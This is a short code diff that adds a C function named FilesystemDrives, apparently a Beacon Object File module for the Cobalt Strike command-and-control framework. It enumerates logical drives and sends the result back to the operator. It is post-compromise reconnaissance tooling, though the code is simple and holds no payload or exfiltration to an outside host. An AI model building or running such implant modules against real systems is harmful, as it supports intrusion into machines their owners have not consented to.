@@ -85,3 +85,24 @@ void FilesystemCopy(char* buffer, int length)
 
 	BeaconDataFree(locals);
 }
+
+void FilesystemDrives(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+
+	formatp locals;
+	BeaconFormatAlloc(&locals, 128);
+
+	int value = BeaconDataInt(&parser);
+	BeaconFormatInt(&locals, value);
+
+	int logicalDrives = GetLogicalDrives();
+	BeaconFormatPrintf(&locals, "%u", logicalDrives);
+
+	int size = BeaconFormatLength(&locals);
+	char* data = BeaconFormatOriginal(&locals);
+	BeaconOutput(CALLBACK_PENDING, data, size);
+
+	BeaconFormatFree(&locals);
+}
